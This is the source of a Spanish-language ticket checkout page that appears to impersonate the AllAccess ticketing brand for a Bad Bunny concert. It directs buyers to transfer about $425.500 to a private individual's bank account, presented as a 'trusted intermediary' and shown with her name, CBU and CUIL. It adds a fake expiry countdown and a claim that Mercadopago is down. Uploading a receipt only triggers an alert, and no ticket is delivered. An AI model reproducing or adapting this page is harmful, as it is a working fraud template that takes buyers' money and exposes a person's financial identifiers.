<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllAccess - Bad Bunny - Pago</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-image: 
                linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)),
                url('images/lemoncash.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            margin: 0;
        }

        /* NAVBAR FIJA */
        .navbar {
            background: #000;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 2000;
            box-sizing: border-box;
        }

        .navbar .logo {
            cursor: pointer;
        }

        .navbar .logo img {
            height: 25px;
        }

        .navbar-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .timer-display {
            color: white;
            font-size: 14px;
            font-weight: 600;
        }

        .menu-icon {
            color: white;
            font-size: 24px;
            cursor: pointer;
        }

        /* MENÃš LATERAL */
        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            z-index: 2001;
        }

        .menu-overlay.active {
            display: block;
        }

        .menu-sidebar {
            position: fixed;
            top: 0;
            right: -300px;
            width: 300px;
            height: 100%;
            background: white;
            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
            transition: right 0.3s ease;
            z-index: 2002;
            overflow-y: auto;
        }

        .menu-sidebar.active {
            right: 0;
        }

        .menu-header {
            padding: 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .menu-header h3 {
            margin: 0;
            font-size: 16px;
        }

        .menu-close {
            font-size: 24px;
            cursor: pointer;
            color: #000;
            background: none;
            border: none;
        }

        .menu-items {
            padding: 20px 0;
        }

        .menu-item {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
            color: #000;
            text-decoration: none;
            display: block;
            font-size: 14px;
            transition: background 0.3s;
        }

        .menu-item:hover {
            background: #f9f9f9;
            color: #7c00e2;
        }

        .content-wrapper {
            padding-top: 49px;
            padding-bottom: 100px;
            background-color: transparent;
            min-height: 100vh;
        }

        /* CONTENEDOR PRINCIPAL */
        .main-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 30px;
            color: #000;
        }

        .payment-container {
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }

        .payment-option {
            background: #f9f9f9;
            border: 2px solid #eee;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .payment-option:hover {
            border-color: #7c00e2;
            background: #f9f7ff;
        }

        .payment-option.active {
            border-color: #7c00e2;
            background: #f9f7ff;
        }

        .payment-option-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }

        .payment-icon {
            font-size: 30px;
        }

        .payment-title {
            font-weight: 700;
            font-size: 16px;
            color: #000;
        }

        .payment-details {
            background: white;
            border: 1px dashed #7c00e2;
            border-radius: 8px;
            padding: 20px;
            margin-top: 15px;
            display: none;
        }

        .payment-details.show {
            display: block;
        }

        .cbu-section {
            background: #f0f4ff;
            border: 1px solid #d0deff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }

        .cbu-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 8px;
            display: block;
        }

        .cbu-value {
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: 700;
            color: #7c00e2;
            display: flex;
            align-items: center;
            gap: 10px;
            word-break: break-all;
        }

        .copy-btn {
            background: #7c00e2;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            flex-shrink: 0;
        }

        .copy-btn:hover {
            background: #6a00cc;
        }

        .info-box {
            background: #fffbf0;
            border: 1px solid #ffe4c4;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            font-size: 13px;
            color: #666;
            line-height: 1.6;
        }

        .info-box.success {
            background: #f0fdf4;
            border-color: #86efac;
        }

        .info-box strong {
            color: #000;
        }

        .upload-section {
            margin-top: 30px;
        }

        .upload-section h4 {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #000;
        }

        .file-upload {
            border: 2px dashed #d0deff;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            background: #f9f7ff;
        }

        .file-upload:hover {
            border-color: #7c00e2;
            background: #f0e6ff;
        }

        .file-upload.has-file {
            border-color: #86efac;
            background: #f0fdf4;
        }

        .upload-icon {
            font-size: 40px;
            margin-bottom: 10px;
        }

        .upload-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
        }

        .upload-hint {
            font-size: 12px;
            color: #999;
        }

        .file-name {
            margin-top: 10px;
            font-size: 13px;
            color: #7c00e2;
            font-weight: 600;
        }

        #fileInput {
            display: none;
        }

        .divider {
            border-top: 1px solid #eee;
            margin: 20px 0;
        }

        /* BARRA DE TOTAL */
        .total-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.1);
            z-index: 1500;
        }

        .total-content {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .total-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .total-label {
            color: #666;
            font-size: 14px;
        }

        .total-amount {
            font-weight: 700;
            font-size: 18px;
            color: #000;
        }

        .btn-finalize {
            background: #7c00e2;
            color: white;
            border: none;
            padding: 12px 50px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }

        .btn-finalize:hover:not(:disabled) {
            background: #6a00cc;
        }

        .btn-finalize:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        @media (max-width: 768px) {
            .page-title {
                font-size: 22px;
            }

            .payment-container {
                padding: 20px;
            }

            .total-bar {
                flex-direction: column;
                gap: 15px;
            }

            .total-content {
                width: 100%;
                flex-direction: column;
            }

            .btn-finalize {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <nav class="navbar">
        <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;"><img src="images/allaccess-clear.png" alt="AllAccess"></div>
        <div class="navbar-right">
            <div class="timer-display">La reserva expira en <span id="timer">03:00</span></div>
            <div class="menu-icon" onclick="toggleMenu()" style="cursor: pointer;">â˜°</div>
        </div>
    </nav>

    <!-- MENÃš LATERAL -->
    <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
    <div class="menu-sidebar" id="menuSidebar">
        <div class="menu-header">
            <h3>MenÃº</h3>
            <button class="menu-close" onclick="closeMenu()">Ã—</button>
        </div>
        <div class="menu-items">
            <a href="my-entries.html" class="menu-item">Mis entradas</a>
            <a href="index.html" class="menu-item">Inicio</a>
        </div>
    </div>

    <div class="content-wrapper">
        <div class="main-container">
            <h1 class="page-title">Abona tu compra <span id="clientName"></span></h1>

            <div class="payment-container">
                <div class="payment-option active" id="virtualWalletOption" onclick="selectPaymentMethod(this, 'wallet')">
                    <div class="payment-option-header">
                        <div class="payment-title">Billetera Virtual</div>
                    </div>

                    <div class="payment-details show" id="walletDetails">
                        <div class="cbu-section">
                            <span class="cbu-label">CBU para intermediaria:</span>
                            <div class="cbu-value">
                                0000168300000021716126
                                <button class="copy-btn" onclick="copyCBU()">Copiar</button>
                            </div>
                            <div style="margin-top: 12px; padding-top: 12px; border-top: 1px solid #d0deff; font-size: 13px; color: #666;">
                                <strong>Titular:</strong> Maria Alejandra Picallo<br>
                                <strong>CUIL:</strong> 27243581813
                            </div>
                        </div>
                        
                        <div class="info-box" style="margin-top: 15px;">
                            <strong>ðŸ’¡ Â¿Por quÃ© transferir a una intermediaria?</strong><br>
                            Maria Alejandra Picallo es una intermediaria confiable que se toma el tiempo de validar que no haya estafas. 
                            Ella verifica cada comprobante de pago antes de confirmar tus entradas, protegiendo tanto a compradores como a vendedores. 
                            Este proceso adicional nos permite garantizar transacciones seguras.
                        </div>

                        <div class="info-box">
                            <strong>Transferencia disponible por:</strong><br>
                            âœ“ Billeteras virtuales (UalÃ¡, Brubank, Banco del Bicentenario, etc.)<br>
                            âœ“ Cualquier cuenta bancaria
                            <br><br>
                            <strong style="color: #ff6b6b;">âœ• Mercadopago NO disponible (actualmente colapsado)</strong>
                        </div>

                        <div class="divider"></div>

                        <div class="info-box success">
                            <strong>âœ“ DespuÃ©s de hacer la transferencia:</strong><br>
                            Sube el comprobante de pago en el apartado inferior y presiona "Finalizar". En menos de 30 segundos recibirÃ¡s tu QR, detalles de entrada y confirmaciÃ³n por correo electrÃ³nico.
                        </div>

                        <div class="upload-section">
                            <h4>Seleccionar comprobante</h4>
                            <div class="file-upload" id="fileUploadArea" onclick="document.getElementById('fileInput').click()">
                                <div class="upload-icon">ðŸ“Ž</div>
                                <div class="upload-text">Haz clic para seleccionar archivo</div>
                                <div class="upload-hint">o arrastra tu comprobante aquÃ­</div>
                                <div class="file-name" id="fileName"></div>
                            </div>
                            <input type="file" id="fileInput" accept="image/*,.pdf" onchange="handleFileSelect(event)">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="total-bar">
        <div class="total-content">
            <div class="total-info">
                <span class="total-label">Total a pagar:</span>
                <span class="total-amount" id="totalAmount">$ 425.500,00</span>
            </div>
            <button class="btn-finalize" id="finalizeBtn" onclick="finalizePayment()" disabled>Finalizar</button>
        </div>
    </div>

    <script>
        function toggleMenu() {
            const overlay = document.getElementById('menuOverlay');
            const sidebar = document.getElementById('menuSidebar');
            
            overlay.classList.toggle('active');
            sidebar.classList.toggle('active');
        }

        function closeMenu() {
            const overlay = document.getElementById('menuOverlay');
            const sidebar = document.getElementById('menuSidebar');
            
            overlay.classList.remove('active');
            sidebar.classList.remove('active');
        }

        // Cerrar menÃº al hacer click en un enlace
        document.querySelectorAll('.menu-item').forEach(item => {
            item.addEventListener('click', closeMenu);
        });

        let selectedFile = null;

        // Obtener datos de la sesiÃ³n
        let selectedQuantity = parseInt(sessionStorage.getItem('selectedQuantity')) || 1;
        let basePrice = parseFloat(sessionStorage.getItem('basePrice')) || 350000;

        // Inicializar pÃ¡gina
        document.addEventListener('DOMContentLoaded', function() {
            // Obtener datos personales del localStorage
            const personalData = JSON.parse(localStorage.getItem('personalData') || '{}');
            if (personalData.nombre) {
                document.getElementById('clientName').textContent = personalData.nombre;
            }
            updateTotal();
            startTimer();
        });

        function selectPaymentMethod(element, method) {
            document.querySelectorAll('.payment-option').forEach(el => {
                el.classList.remove('active');
                el.querySelectorAll('.payment-details').forEach(detail => {
                    detail.classList.remove('show');
                });
            });

            element.classList.add('active');
            const details = element.querySelector('.payment-details');
            if (details) {
                details.classList.add('show');
            }

            // Limpiar selecciones de banco y cuotas cuando cambias de mÃ©todo
            if (method === 'card') {
                selectedBank = null;
                selectedInstallments = null;
                document.querySelectorAll('.bank-btn, .installment-btn').forEach(btn => {
                    btn.classList.remove('selected');
                });
                document.getElementById('installmentSummary').classList.remove('show');
            }
        }

        function updateTotal() {
            const subtotal = basePrice * selectedQuantity;
            const serviceFee = 55500;
            const total = subtotal + serviceFee;

            document.getElementById('totalAmount').textContent = '$ ' + total.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }

        function startTimer() {
            let minutes = 3;
            let seconds = 0;

            // Mostrar tiempo inicial
            document.getElementById('timer').textContent = '03:00';

            const interval = setInterval(() => {
                if (minutes === 0 && seconds === 0) {
                    clearInterval(interval);
                    document.getElementById('timer').textContent = '00:00';
                    alert('La reserva ha expirado');
                    return;
                }

                if (seconds === 0) {
                    minutes--;
                    seconds = 59;
                } else {
                    seconds--;
                }

                document.getElementById('timer').textContent = 
                    String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
            }, 1000);
        }

        function copyCBU() {
            const cbu = '0000168300000021716126';
            navigator.clipboard.writeText(cbu).then(() => {
                alert('CBU copiado al portapapeles');
            }).catch(err => {
                console.error('Error al copiar:', err);
            });
        }

        function handleFileSelect(event) {
            const file = event.target.files[0];
            if (file) {
                selectedFile = file;
                document.getElementById('fileName').textContent = 'âœ“ ' + file.name;
                document.getElementById('fileUploadArea').classList.add('has-file');
                document.getElementById('finalizeBtn').disabled = false;
            }
        }

        // Drag and drop
        const fileUploadArea = document.getElementById('fileUploadArea');
        
        fileUploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            fileUploadArea.style.borderColor = '#7c00e2';
            fileUploadArea.style.background = '#f0e6ff';
        });

        fileUploadArea.addEventListener('dragleave', () => {
            fileUploadArea.style.borderColor = '#d0deff';
            fileUploadArea.style.background = '#f9f7ff';
        });

        fileUploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                document.getElementById('fileInput').files = files;
                handleFileSelect({target: {files: files}});
            }
        });

        function finalizePayment() {
            if (!selectedFile) {
                alert('Por favor sube un comprobante de pago');
                return;
            }

            alert('Procesando pago...\nComprobante: ' + selectedFile.name + '\n\nEn menos de 30 segundos recibirÃ¡s tu QR y detalles de entrada.');
            
            // AquÃ­ irÃ­a la lÃ³gica de procesamiento del pago
            // setTimeout(() => {
            //     window.location.href = 'success.html';
            // }, 2000);
        }
    </script>
</body>
</html>
